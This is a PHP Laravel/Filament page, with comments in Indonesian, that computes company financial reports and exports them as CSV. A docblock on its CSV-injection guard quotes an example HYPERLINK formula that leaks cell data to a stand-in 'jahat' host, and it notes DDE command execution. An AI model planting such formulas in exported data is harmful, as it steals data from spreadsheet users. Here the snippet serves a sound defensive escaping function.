<?php

declare(strict_types=1);

namespace App\Filament\Pages;

use App\Enums\KategoriPengeluaran;
use App\Models\Mitra;
use App\Models\Spk;
use App\Models\UangKeluar;
use App\Models\UangMasuk;
use BackedEnum;
use Filament\Pages\Page;
use Filament\Support\Icons\Heroicon;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Response;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * Halaman Laporan.
 *
 * Semua angka dihitung on-the-fly dari transaksi (tidak ada tabel ringkasan),
 * sesuai Schema.md §6.
 *
 * Ekspor CSV memakai endpoint sendiri (bukan paket tambahan) agar tetap
 * ringan. Lihat method `ekspor()`.
 */
class Laporan extends Page
{
    protected string $view = 'filament.pages.laporan';

    protected static string|BackedEnum|null $navigationIcon = Heroicon::OutlinedChartBar;

    protected static string|\UnitEnum|null $navigationGroup = 'Laporan';

    protected static ?string $navigationLabel = 'Laporan';

    protected static ?string $title = 'Laporan Keuangan';

    protected static ?int $navigationSort = 1;

    /** Periode laporan: 1 = bulan ini, 3 = 3 bulan, 12 = 1 tahun, 0 = semua */
    public int $periode = 12;

    public function setPeriode(int $periode): void
    {
        $this->periode = $periode;
    }

    /**
     * Tanggal awal periode terpilih (null = tanpa batas).
     */
    protected function tanggalAwal(): ?Carbon
    {
        return $this->periode > 0
            ? now()->subMonths($this->periode)->startOfMonth()
            : null;
    }

    /**
     * Query uang masuk sesuai periode.
     */
    protected function queryMasuk()
    {
        return UangMasuk::query()
            ->when($this->tanggalAwal(), fn ($q, $t) => $q->where('tanggal', '>=', $t));
    }

    protected function queryKeluar()
    {
        return UangKeluar::query()
            ->when($this->tanggalAwal(), fn ($q, $t) => $q->where('tanggal', '>=', $t));
    }

    /**
     * @return array<string, mixed>
     */
    protected function getViewData(): array
    {
        // ---------------------------------------------------------
        // Ringkasan
        // ---------------------------------------------------------
        $totalMasuk = (float) $this->queryMasuk()->sum('jumlah');
        $totalKeluar = (float) $this->queryKeluar()->sum('jumlah');
        $saldo = $totalMasuk - $totalKeluar;

        $masukDariSpk = (float) $this->queryMasuk()->whereNotNull('spk_id')->sum('jumlah');
        $masukLuarSpk = (float) $this->queryMasuk()->whereNull('spk_id')->sum('jumlah');

        // ---------------------------------------------------------
        // Uang masuk per bulan
        // ---------------------------------------------------------
        $masukPerBulan = $this->queryMasuk()
            ->selectRaw("DATE_FORMAT(tanggal, '%Y-%m') as bulan, COUNT(*) as jumlah_transaksi, SUM(jumlah) as total")
            ->groupBy('bulan')
            ->orderByDesc('bulan')
            ->limit(12)
            ->get();

        $keluarPerBulan = $this->queryKeluar()
            ->selectRaw("DATE_FORMAT(tanggal, '%Y-%m') as bulan, COUNT(*) as jumlah_transaksi, SUM(jumlah) as total")
            ->groupBy('bulan')
            ->orderByDesc('bulan')
            ->limit(12)
            ->get()
            ->keyBy('bulan');

        $perBulan = $masukPerBulan->map(function ($m) use ($keluarPerBulan): array {
            $keluar = $keluarPerBulan->get($m->bulan);
            $masuk = (float) $m->total;
            $keluarNominal = (float) ($keluar->total ?? 0);

            return [
                'bulan' => $m->bulan,
                'label' => Carbon::parse($m->bulan.'-01')->translatedFormat('F Y'),
                'masuk' => $masuk,
                'keluar' => $keluarNominal,
                'selisih' => $masuk - $keluarNominal,
                'jumlah_masuk' => (int) $m->jumlah_transaksi,
                'jumlah_keluar' => (int) ($keluar->jumlah_transaksi ?? 0),
            ];
        });

        // ---------------------------------------------------------
        // Pengeluaran per kategori
        // ---------------------------------------------------------
        $perKategori = $this->queryKeluar()
            ->selectRaw('kategori, COUNT(*) as jumlah_transaksi, SUM(jumlah) as total')
            ->groupBy('kategori')
            ->orderByDesc('total')
            ->get();

        // ---------------------------------------------------------
        // Laba-rugi per SPK
        //
        // `piutang` di sini adalah PIUTANG LANCAR (retensi ditahan tidak
        // dihitung). `retensi_ditahan` ditampilkan terpisah agar transparan.
        // ---------------------------------------------------------
        $labaRugiSpk = Spk::query()
            ->with('mitra')
            ->withSum('uangMasuk as total_masuk', 'jumlah')
            ->withSum('uangKeluar as total_keluar', 'jumlah')
            ->get()
            ->map(function (Spk $spk): array {
                $penerimaan = (float) ($spk->total_masuk ?? 0);

                return [
                    'nomor_spk' => $spk->nomor_spk,
                    'pekerjaan' => $spk->nama_pekerjaan,
                    'mitra' => $spk->mitra?->nama,
                    'nilai_spk' => (float) $spk->nilai_spk,
                    'penerimaan' => $penerimaan,
                    'biaya' => (float) ($spk->total_keluar ?? 0),
                    'laba' => $penerimaan - (float) ($spk->total_keluar ?? 0),
                    'piutang' => $spk->piutangDari($penerimaan),
                    'retensi_ditahan' => $spk->retensiDitahan(),
                ];
            })
            ->sortByDesc('laba')
            ->values();

        // ---------------------------------------------------------
        // Piutang (SPK belum lunas) + umur piutang (aging)
        // ---------------------------------------------------------
        $piutang = Spk::query()
            ->with('mitra')
            ->withSum('uangMasuk as total_masuk', 'jumlah')
            ->get()
            ->map(function (Spk $spk): array {
                $diterima = (float) ($spk->total_masuk ?? 0);

                return [
                    'nomor_spk' => $spk->nomor_spk,
                    'pekerjaan' => $spk->nama_pekerjaan,
                    'mitra' => $spk->mitra?->nama,
                    'nilai_spk' => (float) $spk->nilai_spk,
                    'retensi_ditahan' => $spk->retensiDitahan(),
                    'nilai_tagih' => $spk->nilaiTagih(),
                    'diterima' => $diterima,
                    'sisa' => $spk->piutangDari($diterima),
                    'sisa_hak_penuh' => $spk->sisaHakPenuhDari($diterima),
                    'status_tagihan' => $spk->status_tagihan?->label() ?? '—',
                    'umur_hari' => $spk->umurHari(),
                    'kelompok_umur' => $spk->kategoriUmur(),
                    'tanggal_spk' => $spk->tanggal_spk?->format('d/m/Y'),
                ];
            })
            ->filter(fn (array $r): bool => $r['sisa'] > 0 || $r['retensi_ditahan'] > 0)
            ->sortByDesc('sisa')
            ->values();

        // ---------------------------------------------------------
        // Umur piutang (aging) — kelompokkan piutang lancar
        // ---------------------------------------------------------
        $kelompokUmur = ['0-30', '31-60', '61-90', '>90', 'tanpa-tanggal'];

        $aging = collect($kelompokUmur)->map(function (string $kelompok) use ($piutang): array {
            $baris = $piutang->where('kelompok_umur', $kelompok);

            return [
                'kelompok' => $kelompok,
                'label' => match ($kelompok) {
                    '0-30' => '0 – 30 hari',
                    '31-60' => '31 – 60 hari',
                    '61-90' => '61 – 90 hari',
                    '>90' => 'Lebih dari 90 hari',
                    default => 'Tanpa tanggal SPK',
                },
                'jumlah_spk' => $baris->count(),
                'total' => (float) $baris->sum('sisa'),
                'bahaya' => in_array($kelompok, ['>90'], true),
                'peringatan' => in_array($kelompok, ['61-90'], true),
            ];
        })->values();

        $totalRetensiDitahan = (float) $piutang->sum('retensi_ditahan');

        // ---------------------------------------------------------
        // Tenggat SPK (dari tanggal_akhir)
        // ---------------------------------------------------------
        $spkLewatTenggat = Spk::query()
            ->lewatTenggat()
            ->belumLunas()
            ->with('mitra')
            ->orderBy('tanggal_akhir')
            ->get();

        $spkMendekatiTenggat = Spk::query()
            ->mendekatiTenggat()
            ->belumLunas()
            ->with('mitra')
            ->orderBy('tanggal_akhir')
            ->get();

        return [
            'periode' => $this->periode,
            'totalMasuk' => $totalMasuk,
            'totalKeluar' => $totalKeluar,
            'saldo' => $saldo,
            'masukDariSpk' => $masukDariSpk,
            'masukLuarSpk' => $masukLuarSpk,
            'perBulan' => $perBulan,
            'perKategori' => $perKategori,
            'labaRugiSpk' => $labaRugiSpk,
            'piutang' => $piutang,
            'aging' => $aging,
            'totalRetensiDitahan' => $totalRetensiDitahan,
            'spkLewatTenggat' => $spkLewatTenggat,
            'spkMendekatiTenggat' => $spkMendekatiTenggat,
            'jumlahSpk' => Spk::count(),
            'jumlahMitra' => Mitra::count(),
            'totalPiutang' => (float) $piutang->sum('sisa'),
        ];
    }

    /**
     * Ekspor data laporan ke CSV.
     *
     * Dipakai tombol "Ekspor CSV" di halaman. CSV dipilih karena bisa dibuka
     * di Excel (yang selama ini dipakai perusahaan) tanpa paket tambahan.
     */
    public function ekspor(string $jenis): StreamedResponse
    {
        $data = $this->getViewData();

        [$judul, $header, $baris] = match ($jenis) {
            'cashflow' => [
                'Laporan Arus Kas',
                ['Bulan', 'Uang Masuk', 'Uang Keluar', 'Selisih'],
                $data['perBulan']->map(fn (array $r): array => [
                    $r['label'],
                    $r['masuk'],
                    $r['keluar'],
                    $r['selisih'],
                ])->all(),
            ],
            'kategori' => [
                'Laporan Pengeluaran per Kategori',
                ['Kategori', 'Jumlah Transaksi', 'Total'],
                $data['perKategori']->map(function ($r): array {
                    // `kategori` sudah di-cast ke Enum oleh model — ubah ke label.
                    $kategori = $r->kategori;

                    return [
                        $kategori instanceof KategoriPengeluaran
                            ? $kategori->label()
                            : ($kategori ?? 'Tanpa kategori'),
                        $r->jumlah_transaksi,
                        (float) $r->total,
                    ];
                })->all(),
            ],
            'laba_rugi' => [
                'Laporan Laba-Rugi per SPK',
                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Nilai SPK', 'Penerimaan', 'Biaya', 'Laba/Rugi', 'Piutang Lancar', 'Retensi Ditahan'],
                $data['labaRugiSpk']->map(fn (array $r): array => [
                    $r['nomor_spk'],
                    $r['pekerjaan'],
                    $r['mitra'] ?? '—',
                    $r['nilai_spk'],
                    $r['penerimaan'],
                    $r['biaya'],
                    $r['laba'],
                    $r['piutang'],
                    $r['retensi_ditahan'],
                ])->all(),
            ],
            'piutang' => [
                'Laporan Piutang SPK',
                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Tanggal SPK', 'Umur (hari)', 'Nilai SPK', 'Retensi Ditahan', 'Nilai Dapat Ditagih', 'Diterima', 'Piutang Lancar', 'Status Tagihan'],
                $data['piutang']->map(fn (array $r): array => [
                    $r['nomor_spk'],
                    $r['pekerjaan'],
                    $r['mitra'] ?? '—',
                    $r['tanggal_spk'] ?? '—',
                    $r['umur_hari'] ?? '—',
                    $r['nilai_spk'],
                    $r['retensi_ditahan'],
                    $r['nilai_tagih'],
                    $r['diterima'],
                    $r['sisa'],
                    $r['status_tagihan'],
                ])->all(),
            ],
            'aging' => [
                'Laporan Umur Piutang (Aging)',
                ['Kelompok Umur', 'Jumlah SPK', 'Total Piutang'],
                $data['aging']->map(fn (array $r): array => [
                    $r['label'],
                    $r['jumlah_spk'],
                    $r['total'],
                ])->all(),
            ],
            'tenggat' => [
                'Laporan Tenggat SPK',
                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Tenggat', 'Sisa Hari', 'Keterangan', 'Nilai SPK'],
                $data['spkLewatTenggat']
                    ->map(fn (Spk $s): array => [
                        $s->nomor_spk,
                        $s->nama_pekerjaan,
                        $s->mitra?->nama ?? '—',
                        $s->tanggal_akhir?->format('d/m/Y') ?? '—',
                        $s->sisaTenggatHari() ?? '—',
                        'LEWAT TENGGAT',
                        (float) $s->nilai_spk,
                    ])
                    ->concat(
                        $data['spkMendekatiTenggat']->map(fn (Spk $s): array => [
                            $s->nomor_spk,
                            $s->nama_pekerjaan,
                            $s->mitra?->nama ?? '—',
                            $s->tanggal_akhir?->format('d/m/Y') ?? '—',
                            $s->sisaTenggatHari() ?? '—',
                            'MENDEKATI TENGGAT',
                            (float) $s->nilai_spk,
                        ])
                    )
                    ->all(),
            ],
            default => [
                'Laporan SPK',
                ['Nomor SPK', 'Pekerjaan', 'Mitra', 'Nilai SPK', 'Penerimaan', 'Biaya', 'Laba/Rugi'],
                $data['labaRugiSpk']->map(fn (array $r): array => [
                    $r['nomor_spk'],
                    $r['pekerjaan'],
                    $r['mitra'] ?? '—',
                    $r['nilai_spk'],
                    $r['penerimaan'],
                    $r['biaya'],
                    $r['laba'],
                ])->all(),
            ],
        };

        $namaFile = str($judul)->slug().'-'.now()->format('Y-m-d').'.csv';

        return Response::streamDownload(function () use ($judul, $header, $baris): void {
            $out = fopen('php://output', 'w');

            // BOM agar Excel membaca UTF-8 dengan benar
            fwrite($out, "\xEF\xBB\xBF");

            fputcsv($out, [self::amanCsv($judul)], ';');
            fputcsv($out, ['Dicetak: '.now()->format('d/m/Y H:i')], ';');
            fputcsv($out, [], ';');
            fputcsv($out, array_map(self::amanCsv(...), $header), ';');

            foreach ($baris as $r) {
                fputcsv($out, array_map(self::amanCsv(...), (array) $r), ';');
            }

            fclose($out);
        }, $namaFile, ['Content-Type' => 'text/csv; charset=UTF-8']);
    }

    /**
     * Cegah CSV INJECTION.
     *
     * ⚠️ TEMUAN AUDIT KEAMANAN:
     * Kalau sebuah sel dimulai dengan `=`, `+`, `-`, atau `@`, Excel/Calc
     * menganggapnya RUMUS dan menjalankannya. Contohnya nama pekerjaan
     * "=HYPERLINK(""http://jahat/?x=""&A1)" bisa mencuri data, dan pada
     * Excel lama rumus DDE bisa menjalankan perintah.
     *
     * Karena file CSV ini dibuka di Excel (aplikasi yang dipakai
     * perusahaan), nilai dari database HARUS dinetralkan dulu.
     *
     * Cara: beri awalan apostrof (`'`) pada nilai teks yang diawali
     * karakter berbahaya. Excel akan menampilkannya sebagai teks biasa.
     * Angka asli (int/float) TIDAK disentuh supaya tetap bisa dihitung.
     */
    private static function amanCsv(mixed $nilai): mixed
    {
        // Angka & null: biarkan apa adanya (aman, dan tetap bisa dijumlahkan).
        if ($nilai === null || is_int($nilai) || is_float($nilai)) {
            return $nilai;
        }

        $teks = (string) $nilai;

        if ($teks === '') {
            return $teks;
        }

        // Karakter yang memicu rumus di Excel/Calc.
        // Termasuk TAB (0x09) & CR (0x0D) karena bisa dipakai menyusupkan.
        if (preg_match('/^[=+\-@\t\r]/', $teks) === 1) {
            return "'".$teks;
        }

        return $teks;
    }

    /**
     * Ringkasan singkat untuk ditampilkan di header.
     */
    public function getSubheading(): ?string
    {
        return match ($this->periode) {
            1 => 'Periode: bulan ini',
            3 => 'Periode: 3 bulan terakhir',
            12 => 'Periode: 12 bulan terakhir',
            default => 'Periode: semua data',
        };
    }
}
